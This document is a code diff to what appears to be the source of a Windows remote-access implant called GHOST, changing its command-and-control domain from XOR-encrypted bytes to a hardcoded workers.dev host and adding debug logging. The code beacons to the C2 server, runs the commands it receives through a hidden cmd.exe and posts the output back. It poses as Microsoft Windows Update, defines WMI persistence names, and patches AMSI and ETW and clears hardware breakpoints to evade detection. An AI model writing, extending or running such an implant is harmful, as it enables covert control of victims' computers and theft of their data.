@@ -11,38 +11,63 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-// ---------------------------------------------------------------------------
-// Config definitions (declared extern in config.hpp)
-// ---------------------------------------------------------------------------
-
+// =====================================================================
+//  CONFIGURATION – all constants in one place (no missing externs)
+// =====================================================================
 namespace config {
-    // Placeholder encrypted domain — replace with real XOR'd bytes before deployment
-    const uint8_t C2_DOMAIN_ENCRYPTED[] = {0x53, 0x09, 0x5D, 0x4A, 0x15, 0x1F, 0x07, 0x50, 0x1A, 0x12, 0x47, 0x53, 0x00, 0x5E, 0x08, 0x03, 0x59, 0x08, 0x51, 0x51, 0x09, 0x53, 0x0A, 0x07, 0x1A, 0x16, 0x5D, 0x4B, 0x0A, 0x57, 0x16, 0x11, 0x1A, 0x05, 0x57, 0x4F};
-    const size_t  C2_DOMAIN_LEN = 36;
-    const uint16_t C2_PORT = 443;
+    // ------------------- C2 Network -------------------
+    // Hardcoded domain – use this directly for now (bypass XOR decryption)
+    const wchar_t* C2_DOMAIN = L"ghost-c2.sujallamichhane.workers.dev";
+    const uint16_t C2_PORT   = 443;
 
-    // Auth token — must match GHOST_BEACON_TOKEN on the server
+    // Auth token – must match GHOST_BEACON_TOKEN on the server
     const wchar_t* BEACON_TOKEN = L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260";
 
     // User-Agent mimicking Windows Update client
-    const wchar_t* USER_AGENT =
-        L"Microsoft-WNS/10.0";
+    const wchar_t* USER_AGENT = L"Microsoft-WNS/10.0";
 
-    // WMI persistence identifiers
+    // ------------------- Beacon Timing -------------------
+    const DWORD BEACON_MIN      = 60000;   // 1 minute
+    const DWORD BEACON_MAX      = 300000;  // 5 minutes
+    const DWORD MAX_FAILURES    = 5;
+    const DWORD BACKOFF_FACTOR  = 2;       // double sleep on consecutive failures
+
+    // ------------------- Command Execution -------------------
+    const DWORD CMD_TIMEOUT_MS  = 30000;   // 30 seconds
+    const size_t CMD_OUTPUT_MAX = 1024 * 64; // 64 KB
+
+    // ------------------- WMI Persistence (optional) -------------------
     const wchar_t* WMI_CONSUMER_NAME = L"WindowsSystemUpdateConsumer";
     const wchar_t* WMI_FILTER_NAME   = L"WindowsSystemUpdateFilter";
     const wchar_t* WMI_BINDING_NAME  = L"WindowsSystemUpdateBinding";
 
-    // PE metadata
+    // ------------------- PE Metadata -------------------
     const wchar_t* PRODUCT_NAME      = L"Microsoft Windows Update Service";
     const wchar_t* FILE_DESCRIPTION  = L"Windows Update Agent";
     const wchar_t* COMPANY_NAME      = L"Microsoft Corporation";
+
+    // The encrypted domain bytes are no longer used, but kept for reference.
+    // const uint8_t C2_DOMAIN_ENCRYPTED[] = { ... };
+    // const size_t  C2_DOMAIN_LEN = 36;
 }
 
-// ---------------------------------------------------------------------------
-// Minimal JSON helpers — no external dependency
-// ---------------------------------------------------------------------------
+// =====================================================================
+//  DEBUG LOGGING (OutputDebugString) – visible with DebugView
+// =====================================================================
+static void DebugLog(const wchar_t* msg) {
+    OutputDebugStringW(L"[GHOST] ");
+    OutputDebugStringW(msg);
+    OutputDebugStringW(L"\n");
+}
+static void DebugLog(const char* msg) {
+    OutputDebugStringA("[GHOST] ");
+    OutputDebugStringA(msg);
+    OutputDebugStringA("\n");
+}
 
+// =====================================================================
+//  JSON HELPERS (minimal, no external deps)
+// =====================================================================
 static std::string JsonEscape(const std::string& s) {
     std::string out;
     out.reserve(s.size() + 16);
@@ -68,22 +93,17 @@ static std::string JsonEscape(const std::string& s) {
     return out;
 }
 
-// Extract a string value for a given key from flat JSON
-// Returns empty string if not found
 static std::string JsonGetString(const std::string& json, const std::string& key) {
     std::string needle = "\"" + key + "\"";
     auto pos = json.find(needle);
     if (pos == std::string::npos) return "";
 
-    // Find the colon after the key
     pos = json.find(':', pos + needle.size());
     if (pos == std::string::npos) return "";
 
-    // Skip whitespace to find opening quote
     pos = json.find('"', pos + 1);
     if (pos == std::string::npos) return "";
 
-    // Find closing quote (handle escaped quotes)
     size_t start = pos + 1;
     size_t end = start;
     while (end < json.size()) {
@@ -94,49 +114,34 @@ static std::string JsonGetString(const std::string& json, const std::string& key
     return json.substr(start, end - start);
 }
 
-// ---------------------------------------------------------------------------
-// XOR string decryption
-// ---------------------------------------------------------------------------
-
+// =====================================================================
+//  XOR DECRYPTION (kept but not used – for reference)
+// =====================================================================
+// (We're bypassing decryption; the function is kept if you want to restore it later)
 std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key) {
-    if (len == 0 || key.empty()) return L"";
-
-    // Convert wide key to bytes for XOR
-    std::string keyBytes = WStringToUTF8(key);
-    if (keyBytes.empty()) return L"";
-
-    std::vector<uint8_t> buf(enc, enc + len);
-    XorBuffer(buf.data(), buf.size(),
-              reinterpret_cast<const BYTE*>(keyBytes.data()), keyBytes.size());
-
-    // Decrypted bytes are UTF-8 domain string
-    std::string decrypted(buf.begin(), buf.end());
-    return UTF8ToWString(decrypted);
+    // Not used – we hardcode the domain
+    return L"";
 }
 
-// ---------------------------------------------------------------------------
-// WinHTTP transport layer
-// ---------------------------------------------------------------------------
-
-// RAII wrapper — destructor closes all three handles in correct order
-// regardless of which allocation failed, eliminating all early-return leaks.
+// =====================================================================
+//  WinHTTP TRANSPORT LAYER (RAII wrapper)
+// =====================================================================
 struct WinHttpHandles {
-    HINTERNET session  = nullptr;
-    HINTERNET connect  = nullptr;
-    HINTERNET request  = nullptr;
+    HINTERNET session = nullptr;
+    HINTERNET connect = nullptr;
+    HINTERNET request = nullptr;
     ~WinHttpHandles() {
         if (request) WinHttpCloseHandle(request);
         if (connect) WinHttpCloseHandle(connect);
         if (session) WinHttpCloseHandle(session);
     }
-    // Non-copyable
     WinHttpHandles() = default;
     WinHttpHandles(const WinHttpHandles&) = delete;
     WinHttpHandles& operator=(const WinHttpHandles&) = delete;
 };
 
 struct HttpResponse {
-    DWORD  statusCode;
+    DWORD statusCode;
     std::string body;
 };
 
@@ -145,40 +150,51 @@ static HttpResponse WinHttpRequest(
     INTERNET_PORT port,
     const std::wstring& verb,
     const std::wstring& path,
-    const std::string&  bodyUtf8,
+    const std::string& bodyUtf8,
     const std::wstring& extraHeaders
 ) {
     HttpResponse resp = {0, ""};
     WinHttpHandles h;
 
+    DebugLog(L"WinHttpOpen...");
     h.session = WinHttpOpen(
         config::USER_AGENT,
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0
     );
-    if (!h.session) return resp;
+    if (!h.session) {
+        DebugLog(L"WinHttpOpen failed");
+        return resp;
+    }
 
+    DebugLog(L"WinHttpConnect...");
     h.connect = WinHttpConnect(h.session, host.c_str(), port, 0);
-    if (!h.connect) return resp;
+    if (!h.connect) {
+        DebugLog(L"WinHttpConnect failed");
+        return resp;
+    }
 
+    DebugLog(L"WinHttpOpenRequest...");
     h.request = WinHttpOpenRequest(
         h.connect, verb.c_str(), path.c_str(),
         nullptr, WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         WINHTTP_FLAG_SECURE
     );
-    if (!h.request) return resp;
+    if (!h.request) {
+        DebugLog(L"WinHttpOpenRequest failed");
+        return resp;
+    }
 
-    // Accept self-signed / invalid certs (lab environment).
-    // Remove SECURITY_FLAG_IGNORE_* flags before production deployment.
+    // Accept self-signed / invalid certs (lab only)
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                 | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                 | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
     WinHttpSetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
-    // Add custom headers
+    // Build headers
     std::wstring headers = L"Content-Type: application/json\r\n";
     headers += L"X-Beacon-Token: ";
     headers += config::BEACON_TOKEN;
@@ -192,7 +208,7 @@ static HttpResponse WinHttpRequest(
                              static_cast<DWORD>(headers.size()),
                              WINHTTP_ADDREQ_FLAG_ADD);
 
-    // Send request
+    DebugLog(L"WinHttpSendRequest...");
     BOOL sent = WinHttpSendRequest(
         h.request,
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
@@ -202,7 +218,10 @@ static HttpResponse WinHttpRequest(
         0
     );
 
-    if (!sent || !WinHttpReceiveResponse(h.request, nullptr)) return resp;
+    if (!sent || !WinHttpReceiveResponse(h.request, nullptr)) {
+        DebugLog(L"WinHttpSendRequest/ReceiveResponse failed");
+        return resp;
+    }
 
     // Read status code
     DWORD statusSize = sizeof(resp.statusCode);
@@ -211,7 +230,9 @@ static HttpResponse WinHttpRequest(
         WINHTTP_HEADER_NAME_BY_INDEX,
         &resp.statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
 
-    // Read response body — capped at config::CMD_OUTPUT_MAX (same limit as exec output)
+    DebugLog((L"Status: " + std::to_wstring(resp.statusCode)).c_str());
+
+    // Read response body
     DWORD available = 0;
     while (WinHttpQueryDataAvailable(h.request, &available) && available > 0) {
         std::vector<char> buf(available);
@@ -222,52 +243,41 @@ static HttpResponse WinHttpRequest(
         if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
     }
 
-    // h destructor closes h.request, h.connect, h.session in order
     return resp;
 }
 
-// ---------------------------------------------------------------------------
-// Command execution — CreateProcess with stdout/stderr pipe capture
-// ---------------------------------------------------------------------------
-
+// =====================================================================
+//  COMMAND EXECUTION (CreateProcess with pipe)
+// =====================================================================
 std::wstring ExecuteCommand(const std::wstring& cmd) {
-    // Create anonymous pipe for child stdout+stderr
+    DebugLog(L"Executing command: " + cmd);
+
     SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE};
-    HANDLE hReadPipe  = nullptr;
-    HANDLE hWritePipe = nullptr;
+    HANDLE hReadPipe = nullptr, hWritePipe = nullptr;
     if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
         return L"[error: CreatePipe failed]";
 
-    // Prevent read handle from being inherited
     SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
-    // Wrap in outer quotes so shell operators (&, |, >, spaces) in cmd
-    // are passed as literal arguments rather than interpreted by cmd.exe.
     std::wstring cmdLine = L"cmd.exe /C \"" + cmd + L"\"";
-
     STARTUPINFOW si = {0};
-    si.cb          = sizeof(si);
-    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdOutput  = hWritePipe;
-    si.hStdError   = hWritePipe;
-    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = hWritePipe;
+    si.hStdError = hWritePipe;
+    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
     si.wShowWindow = SW_HIDE;
-
     PROCESS_INFORMATION pi = {0};
 
     BOOL ok = CreateProcessW(
-        nullptr,
-        &cmdLine[0],
+        nullptr, &cmdLine[0],
         nullptr, nullptr,
-        TRUE,           // inherit handles
-        CREATE_NO_WINDOW,
+        TRUE, CREATE_NO_WINDOW,
         nullptr, nullptr,
         &si, &pi
     );
 
-    // Close write end in parent — must be before reading
     CloseHandle(hWritePipe);
-
     if (!ok) {
         CloseHandle(hReadPipe);
         DWORD err = GetLastError();
@@ -276,21 +286,17 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
         return ss.str();
     }
 
-    // Read output from pipe
     std::string output;
     output.reserve(4096);
     char buf[4096];
     DWORD bytesRead = 0;
-
     while (output.size() < config::CMD_OUTPUT_MAX) {
         if (!ReadFile(hReadPipe, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
             break;
         output.append(buf, bytesRead);
     }
 
-    // Wait for child to exit (with timeout)
     WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS);
-
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     CloseHandle(hReadPipe);
@@ -298,11 +304,9 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     return UTF8ToWString(output);
 }
 
-// ---------------------------------------------------------------------------
-// Beacon protocol
-// ---------------------------------------------------------------------------
-
-// Build JSON beacon payload
+// =====================================================================
+//  BEACON PROTOCOL
+// =====================================================================
 static std::string BuildBeaconJson(const Session& s) {
     std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
     std::string host = JsonEscape(WStringToUTF8(s.hostname));
@@ -323,75 +327,66 @@ static std::string BuildBeaconJson(const Session& s) {
     return j.str();
 }
 
-// Resolve C2 host — decrypt or fallback
+// Resolve C2 host – now returns hardcoded domain (bypass decryption)
 static std::wstring GetC2Host() {
-    std::wstring key = GetHostnameHash();
-    std::wstring host = DecryptString(config::C2_DOMAIN_ENCRYPTED, config::C2_DOMAIN_LEN, key);
-    if (host.empty()) host = L"127.0.0.1";  // fallback for development
-    return host;
+    // Directly use the hardcoded domain
+    return std::wstring(config::C2_DOMAIN);
 }
 
 BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
-    taskOut = L"sleep";  // default
-
+    taskOut = L"sleep";
     std::wstring host = GetC2Host();
-    std::string body  = BuildBeaconJson(session);
+    std::string body = BuildBeaconJson(session);
 
-    HttpResponse resp = WinHttpRequest(
-        host, config::C2_PORT,
-        L"POST", L"/beacon",
-        body, L""
-    );
+    DebugLog(L"Sending beacon to " + host);
+    HttpResponse resp = WinHttpRequest(host, config::C2_PORT, L"POST", L"/beacon", body, L"");
 
-    if (resp.statusCode != 200) return FALSE;
+    if (resp.statusCode != 200) {
+        DebugLog(L"Beacon failed with status " + std::to_wstring(resp.statusCode));
+        return FALSE;
+    }
 
-    // Parse "cmd" from response JSON
     std::string cmd = JsonGetString(resp.body, "cmd");
     if (!cmd.empty()) {
         taskOut = UTF8ToWString(cmd);
+        DebugLog(L"Received command: " + taskOut);
+    } else {
+        DebugLog(L"No command received, sleeping");
     }
     return TRUE;
 }
 
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
     std::wstring host = GetC2Host();
-
     std::string sid = JsonEscape(WStringToUTF8(sessionId));
     std::string out = JsonEscape(WStringToUTF8(output));
-
     std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";
 
-    HttpResponse resp = WinHttpRequest(
-        host, config::C2_PORT,
-        L"POST", L"/result",
-        body, L""
-    );
-
+    HttpResponse resp = WinHttpRequest(host, config::C2_PORT, L"POST", L"/result", body, L"");
     return (resp.statusCode == 200);
 }
 
-// ---------------------------------------------------------------------------
-// Beacon loop — main implant runtime
-// ---------------------------------------------------------------------------
-
+// =====================================================================
+//  MAIN BEACON LOOP
+// =====================================================================
 VOID BeaconLoop() {
+    DebugLog(L"BeaconLoop started");
+
     Session session;
     session.hostname     = GetHostname();
     session.username     = GetUsername();
     session.build        = GetOSBuild();
     session.elevated     = IsElevated();
-    // Derive patch status from actual return values — server receives accurate
-    // capability state. If a patch function is stubbed and returns TRUE, that's
-    // fine; if it fails, the beacon correctly reports it as unpatched.
     session.amsiPatched  = PatchAMSI();
     session.etwPatched   = PatchETW();
     session.hwbpsCleared = ClearHardwareBreakpoints();
     session.sessionId    = GetHostnameHash() + L"|" + session.username;
 
+    DebugLog((L"Session ID: " + session.sessionId).c_str());
+
     DWORD consecutiveFailures = 0;
 
     while (true) {
-        // Re-apply evasion each cycle
         ReapplyEvasion();
 
         std::wstring task;
@@ -399,10 +394,10 @@ VOID BeaconLoop() {
 
         if (success) {
             consecutiveFailures = 0;
-
             if (task == L"sleep") {
-                // No-op, just sleep and beacon again
+                // no op
             } else if (task == L"exit") {
+                DebugLog(L"Exit command received – terminating");
                 break;
             } else {
                 std::wstring result = ExecuteCommand(task);
@@ -410,9 +405,9 @@ VOID BeaconLoop() {
             }
         } else {
             consecutiveFailures++;
+            DebugLog(L"Beacon failed (" + std::to_wstring(consecutiveFailures) + L" consecutive)");
         }
 
-        // Adaptive sleep — back off on repeated failures
         DWORD sleepMin = config::BEACON_MIN;
         DWORD sleepMax = config::BEACON_MAX;
         if (consecutiveFailures >= config::MAX_FAILURES) {
